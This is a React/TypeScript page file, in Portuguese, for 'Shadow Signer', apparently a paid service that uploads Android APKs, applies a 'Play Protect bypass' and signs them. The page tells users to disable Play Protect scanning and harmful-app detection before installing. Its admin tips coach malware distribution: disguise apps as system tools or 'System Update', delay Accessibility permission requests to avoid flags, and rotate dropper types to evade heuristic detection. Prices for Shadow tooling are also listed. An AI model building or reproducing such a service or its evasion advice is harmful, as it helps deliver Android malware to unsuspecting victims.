import { createFileRoute, Link, useSearch } from "@tanstack/react-router";
import { useThemeSearchParam } from "@/hooks/use-theme-param";
import { useState, useEffect } from "react";
import { useSuspenseQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { motion, AnimatePresence } from "framer-motion";
import { ShieldCheck, Upload, Loader2, Download, AlertTriangle, CheckCircle2, RefreshCcw, Smartphone, Settings, Info, ArrowRight, ShieldAlert } from "lucide-react";
import { useI18n } from "@/lib/i18n";
import { SidebarProvider, SidebarInset } from "@/components/ui/sidebar";
import { AppSidebar } from "@/components/AppSidebar";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { cancelApkJob, createApkJob, getApkResultDownload, getPlayProtectStatus, listApkJobs } from "@/lib/apk-jobs.functions";
import { fetchMyRole, isStaffRole } from "@/lib/roles";
import { useQuery } from "@tanstack/react-query";
import { SystemHealthIndicator } from "@/components/SystemHealthIndicator";
import { triggerDownload } from "@/lib/download";
import playProtectConfig from "@/assets/play-protect-config.png.asset.json";


export const Route = createFileRoute("/_authenticated/play-protect")({
  head: () => ({
    meta: [
      { title: "Shadow Signer — APK Builder" },
      { name: "description", content: "Envie, acompanhe e baixe seus APKs assinados pelo painel Shadow." },
      { property: "og:title", content: "Shadow Signer — APK Builder" },
      { property: "og:description", content: "Envie, acompanhe e baixe seus APKs assinados pelo painel Shadow." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  loader: async ({ context }) => {
    await context.queryClient.ensureQueryData({
      queryKey: ["apk-jobs"],
      queryFn: () => listApkJobs(),
    });
  },
  component: PlayProtectPage,
});

function PlayProtectPage() {
  const { t } = useI18n();
  const search = useSearch({ from: "/_authenticated/play-protect" }) as any;
  
  useThemeSearchParam(search?.theme);

  const queryClient = useQueryClient();
  const getJobs = useServerFn(listApkJobs);
  const createJob = useServerFn(createApkJob);
  const cancelJob = useServerFn(cancelApkJob);
  const getStatus = useServerFn(getPlayProtectStatus);
  const getResult = useServerFn(getApkResultDownload);

  const [isAdmin, setIsAdmin] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);

  useEffect(() => {
    supabase.auth.getUser().then(async ({ data }) => {
      if (data.user) {
        const role = await fetchMyRole(data.user.id);
        setIsAdmin(isStaffRole(role));
      }
    });
  }, []);

  const { data: user } = useQuery({
    queryKey: ['auth-user'],
    queryFn: async () => {
      const { data } = await supabase.auth.getUser();
      return data.user;
    }
  });

  const { data: accessStatus } = useQuery({
    queryKey: ['play-protect-status', user?.id],
    enabled: !!user?.id,
    queryFn: () => getStatus(),
    retry: 2,
  });

  const hasAccess = Boolean(accessStatus?.canSubmit || accessStatus?.hasActivePlan || isAdmin);

  const { data: jobs } = useSuspenseQuery({
    queryKey: ["apk-jobs"],
    queryFn: () => getJobs(),
    refetchInterval: (query) => {
      const anyProcessing = query.state.data?.some(j => ['queued', 'claimed', 'sending', 'processing'].includes(j.status));
      return anyProcessing ? 3000 : false;
    }
  });


  const MAX_APK_MB = 50;

  const validateApk = async (file: File): Promise<string | null> => {
    if (!file.name.toLowerCase().endsWith(".apk")) return "O arquivo precisa ter extensão .apk";
    if (file.size > MAX_APK_MB * 1024 * 1024) return `APK excede ${MAX_APK_MB}MB`;
    if (file.size < 10 * 1024) return "APK muito pequeno — provavelmente corrompido";
    // Magic number check: APK is a ZIP archive → starts with PK\x03\x04
    try {
      const head = new Uint8Array(await file.slice(0, 4).arrayBuffer());
      if (!(head[0] === 0x50 && head[1] === 0x4b && (head[2] === 0x03 || head[2] === 0x05 || head[2] === 0x07))) {
        return "Arquivo não parece ser um APK válido (assinatura ZIP ausente)";
      }
    } catch {
      /* ignore, backend will re-check */
    }
    return null;
  };

  const handleBuild = async () => {
    if (!selectedFile) {
      toast.error("Selecione um APK para continuar.");
      return;
    }

    const apkError = await validateApk(selectedFile);
    if (apkError) {
      toast.error(apkError);
      return;
    }
    setUploading(true);
    let createdJobId: string | null = null;
    try {
      const reservation = await createJob({ data: { filename: selectedFile.name, sizeBytes: selectedFile.size } });
      createdJobId = reservation.jobId;
      const { error: uploadError } = await supabase.storage
        .from("apk-uploads")
        .uploadToSignedUrl(reservation.path, reservation.token, selectedFile, {
          contentType: "application/vnd.android.package-archive",
        });
      if (uploadError) throw uploadError;

      toast.success("Build iniciada com Shadow Bypass!");
      await Promise.all([
        queryClient.invalidateQueries({ queryKey: ["apk-jobs"] }),
        queryClient.invalidateQueries({ queryKey: ["play-protect-status"] }),
      ]);
      setSelectedFile(null);
    } catch (error: any) {
      if (createdJobId) await cancelJob({ data: { id: createdJobId } }).catch(() => {});
      toast.error("Erro ao iniciar build: " + (error?.message ?? "desconhecido"));
    } finally {
      setUploading(false);
    }
  };

  const downloadResult = async (id: string) => {
    try {
      const result = await getResult({ data: { id } });
      triggerDownload(result.url, result.filename);
    } catch (error: any) {
      toast.error(error?.message ?? "Não foi possível baixar o resultado");
    }
  };


  return (
    <SidebarProvider>
      <div className="admin-enterprise flex min-h-screen w-full">
        <AppSidebar isAdmin={isAdmin} />
        <SidebarInset className="min-w-0 flex-1">
            <header className="sticky top-0 z-30 flex h-14 items-center justify-between gap-3 border-b border-border/60 bg-background/80 px-4 backdrop-blur-md">
            <div className="osint-label text-primary/80">{t("pp.title" as any)}</div>
            <SystemHealthIndicator />
          </header>


          <main className="mx-auto w-full max-w-5xl px-4 py-8 sm:px-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="mb-8"
            >
              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">{t("pp.header" as any)}</h1>
              <p className="mt-2 text-muted-foreground">Envie seu APK, acompanhe o processamento e baixe o arquivo assinado.</p>
              {!hasAccess && (
                <div className="mt-4 flex items-center gap-2 rounded border border-amber-500/30 bg-amber-500/10 p-3 text-xs text-amber-200/90">
                  <AlertTriangle className="h-4 w-4 text-amber-500" />
                  {accessStatus?.blockReason ?? t("pp.no_access" as any)}
                </div>
              )}
            </motion.div>

            <div className="mb-6 grid gap-4 rounded-lg border border-amber-500/30 bg-amber-500/5 p-5 md:grid-cols-[240px_1fr]">
              <a href={playProtectConfig.url} target="_blank" rel="noreferrer" className="block overflow-hidden rounded-md border border-border/60 bg-background/40">
                <img src={playProtectConfig.url} alt="Configuração do Play Protect — quais opções desativar" className="h-full w-full object-contain" loading="lazy" />
              </a>
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <ShieldAlert className="h-5 w-5 text-amber-500" />
                  <h2 className="font-mono text-sm font-bold uppercase tracking-wider">Antes de instalar — desative estas funções</h2>
                </div>
                <p className="text-xs text-muted-foreground">
                  Abra a <strong>Play Store</strong> → menu do perfil → <strong>Play Protect</strong> → <strong>Configurações</strong> e desative:
                </p>
                <ul className="grid gap-1.5 text-xs">
                  {[
                    'Verificar apps com Play Protect',
                    'Melhorar a detecção de apps prejudiciais',
                    'Alertas de permissão de apps',
                    'Notificações do Play Protect',
                  ].map((item) => (
                    <li key={item} className="flex items-center gap-2">
                      <span className="h-1.5 w-1.5 rounded-full bg-amber-500" />
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
                <div className="rounded border border-primary/30 bg-primary/5 p-3 text-xs">
                  <strong className="text-primary">Como funciona:</strong> você envia seu APK aqui, nossa equipe faz o bypass e assina o arquivo. Assim que ficar pronto, o botão de <em>Download</em> aparece na sua build abaixo. Tempo médio: 2 a 5 min.
                </div>
              </div>
            </div>


            <div className={`grid gap-6 md:grid-cols-2 ${!hasAccess ? 'pointer-events-none opacity-50 grayscale' : ''}`}>

              {/* Build Section */}
              <div className="osint-panel p-6">
                <div className="mb-6 flex items-center gap-3">
                  <Settings className="h-5 w-5 text-primary" />
                  <h2 className="font-mono text-sm font-bold uppercase tracking-wider text-foreground">Nova Operação</h2>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="mb-2 block font-mono text-[10px] uppercase text-muted-foreground">Arquivo APK Original</label>
                    <div className="relative">
                      <input
                        type="file"
                        accept=".apk"
                        onChange={(e) => setSelectedFile(e.target.files?.[0] || null)}
                        className="hidden"
                        id="apk-upload"
                      />
                      <label
                        htmlFor="apk-upload"
                        className="flex cursor-pointer items-center justify-between border border-dashed border-border/60 bg-background/50 p-3 transition-colors hover:bg-background/80"
                      >
                        <span className="truncate text-sm text-muted-foreground">
                          {selectedFile ? selectedFile.name : "Selecionar APK..."}
                        </span>
                        <Upload className="h-4 w-4 shrink-0 text-muted-foreground" />
                      </label>
                    </div>
                  </div>

                  <Button
                    onClick={handleBuild}
                    disabled={uploading || !selectedFile || !hasAccess}
                    className="w-full rounded-none font-mono uppercase tracking-widest"
                  >
                    {uploading ? (
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    ) : (
                      <RefreshCcw className="mr-2 h-4 w-4" />
                    )}
                    Iniciar Compilação
                  </Button>
                </div>

                <div className="mt-6 border-t border-border/40 pt-6">
                  <div className="flex gap-3 rounded bg-amber-500/5 p-3 border border-amber-500/20">
                    <Info className="h-5 w-5 shrink-0 text-amber-500" />
                    <p className="text-[11px] leading-relaxed text-amber-200/70">
                      O processamento e a assinatura são feitos em servidores remotos. O tempo estimado é de 2 a 5 minutos.
                    </p>
                  </div>
                </div>
              </div>

              {/* Dicas do Admin / Bypass Messages */}
              <div className="md:col-span-2 space-y-4">
                <AdminTipsSection />
              </div>

              {/* Jobs Section */}
              <div className="osint-panel flex flex-col p-6">
                <div className="mb-6 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <Smartphone className="h-5 w-5 text-primary" />
                    <h2 className="font-mono text-sm font-bold uppercase tracking-wider text-foreground">Operações Recentes</h2>
                  </div>
                  <span className="font-mono text-[10px] text-muted-foreground">{jobs?.length || 0} builds</span>
                </div>

                <div className="flex-1 space-y-3 overflow-y-auto pr-1">
                  {jobs && jobs.length > 0 ? (
                    jobs.map((job) => (
                      <div key={job.id} className="osint-corners border border-border/40 bg-background/40 p-3">
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-display text-sm font-bold text-foreground">{job.source_filename || "APK enviado"}</span>
                          <span className={`font-mono text-[9px] uppercase tracking-tighter ${
                            job.status === 'done' ? 'text-neon' : 
                            job.status === 'failed' ? 'text-danger' : 'text-amber-400'
                          }`}>
                            {job.status}
                          </span>
                        </div>
                        
                        {['queued', 'claimed', 'sending', 'processing'].includes(job.status) && (
                          <div className="space-y-1.5">
                            <Progress value={job.status === 'processing' ? 70 : job.status === 'sending' ? 45 : job.status === 'claimed' ? 25 : 10} className="h-1" />
                            <div className="flex justify-between font-mono text-[8px] text-muted-foreground/60">
                              <span>Processando em cluster...</span>
                              <span>{job.status === 'processing' ? '70%' : job.status === 'sending' ? '45%' : job.status === 'claimed' ? '25%' : '10%'}</span>
                            </div>
                          </div>
                        )}

                        {job.status === 'done' && (
                          <div className="flex items-center justify-between gap-2 mt-2">
                            <div className="flex items-center gap-1.5 text-neon/80">
                              <CheckCircle2 className="h-3 w-3" />
                              <span className="font-mono text-[9px] uppercase">Pronto para implantação</span>
                            </div>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-7 rounded-none px-2 font-mono text-[9px] hover:text-neon"
                               onClick={() => void downloadResult(job.id)}
                            >
                              <Download className="mr-1 h-3 w-3" /> Download
                            </Button>
                          </div>
                        )}

                        {job.status === 'failed' && (
                          <div className="flex items-center gap-1.5 text-danger/80 mt-1">
                            <AlertTriangle className="h-3 w-3" />
                            <span className="font-mono text-[9px]">{job.error_message || "Erro desconhecido"}</span>
                          </div>
                        )}
                        
                        <div className="mt-2 text-[9px] text-muted-foreground/40 font-mono">
                          ID: {job.id.slice(0, 8)} • {new Date(job.created_at).toLocaleString()}
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="flex h-40 flex-col items-center justify-center text-center">
                      <Smartphone className="mb-2 h-8 w-8 text-border/20" />
                      <p className="font-mono text-[10px] text-muted-foreground/40 uppercase">Nenhuma build registrada</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mt-12 rounded-lg border border-violet/40 bg-violet/5 p-6">
              <div className="flex items-center gap-3 mb-4">
                <ShieldAlert className="h-6 w-6 text-violet" />
                <h2 className="text-xl font-bold font-display">Serviço gerenciado de assinatura</h2>
              </div>
              <p className="text-muted-foreground text-sm mb-6">
                Precisa de suporte para um APK complexo? O serviço gerenciado permite enviar o arquivo para análise da equipe.
              </p>
              <Link to="/dashboard" search={{ tab: "play-protect" }}>
                <Button variant="outline" className="font-mono uppercase tracking-widest border-violet/40 hover:bg-violet/10">
                  Acessar Fila de Envios <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              </Link>
            </div>
          </main>
        </SidebarInset>
      </div>
    </SidebarProvider>
  );
}

function AdminTipsSection() {
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState<"all" | "social" | "technical" | "naming">("all");

  const tips = [
    {
      id: "01",
      category: "social",
      title: "Ícones de Sistema",
      text: "Use ícones de aplicativos de sistema ou ferramentas nativas (Calculadora, Notas) para maior eficácia social."
    },
    {
      id: "02",
      category: "naming",
      title: "Engenharia de Nomes",
      text: "Nomes genéricos como 'System Update' ou 'Google Services' costumam ter taxa de retenção 40% maior."
    },
    {
      id: "03",
      category: "technical",
      title: "Builds Pesadas",
      text: "Para APKs acima de 50MB, certifique-se de que a conexão é estável; builds pesadas podem demorar até 8min."
    },
    {
      id: "04",
      category: "social",
      title: "Permissões Críticas",
      text: "Solicite permissões sensíveis (Acessibilidade) apenas após o primeiro boot para evitar flags imediatas."
    },
    {
      id: "05",
      category: "technical",
      title: "Variação de Dropper",
      text: "Alterne o tipo de dropper a cada 5 builds para dificultar o reconhecimento de padrão por heurísticas."
    },
    {
      id: "06",
      category: "technical",
      title: "Verificação de Assinatura",
      text: "O novo bypass é assinado automaticamente durante a compilação. Confirmamos que cada APK gerado passa pela verificação de integridade antes do download."
    },
    {
      id: "07",
      category: "technical",
      title: "Lembrete de Preços",
      text: "Lembrando que o Shadow 4.5.5 custa R$ 450, o de 30 dias custa R$ 750, o servidor custa R$ 250 somente para membros antigos (contas com histórico > 48h ou licença prévia) e o Play Protect da Shadow custa R$ 450."
    }
  ];

  const filteredTips = tips.filter(tip => {
    const matchesSearch = tip.title.toLowerCase().includes(search.toLowerCase()) || 
                         tip.text.toLowerCase().includes(search.toLowerCase());
    const matchesCategory = category === "all" || tip.category === category;
    return matchesSearch && matchesCategory;
  });

  return (
    <div className="osint-panel p-4 border-violet/30 bg-violet/5">
      <div className="flex flex-col gap-4">
        <div className="flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-violet/20 border border-violet/40">
              <ShieldCheck className="h-4 w-4 text-violet" />
            </div>
            <h4 className="font-mono text-[10px] font-bold uppercase tracking-widest text-violet">Shadow Protocol: Dicas do Admin</h4>
          </div>
          <div className="flex gap-2">
            {(["all", "social", "technical", "naming"] as const).map(cat => (
              <button
                key={cat}
                onClick={() => setCategory(cat)}
                className={`px-2 py-0.5 font-mono text-[8px] uppercase tracking-tighter border transition-colors ${
                  category === cat 
                    ? "bg-violet/20 border-violet/50 text-violet" 
                    : "bg-background/20 border-border/40 text-muted-foreground hover:border-violet/30"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        <Input 
          placeholder="Filtrar diretrizes..."
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          className="h-8 rounded-none border-border/40 bg-background/30 font-mono text-[10px] placeholder:text-muted-foreground/50"
        />

        <div className="grid gap-3 sm:grid-cols-3">
          <AnimatePresence mode="popLayout">
            {filteredTips.map(tip => (
              <motion.div
                key={tip.id}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground"
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-bold text-foreground">// Dica #{tip.id}</span>
                  <span className="text-[8px] uppercase tracking-widest text-violet/60">{tip.category}</span>
                </div>
                <div className="mb-1 font-bold text-violet/90 text-[9px] uppercase tracking-wider">{tip.title}</div>
                {tip.text}
              </motion.div>
            ))}
          </AnimatePresence>
          {filteredTips.length === 0 && (
            <div className="sm:col-span-3 py-4 text-center font-mono text-[10px] text-muted-foreground italic">
              Nenhuma diretriz encontrada para "{search}"
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
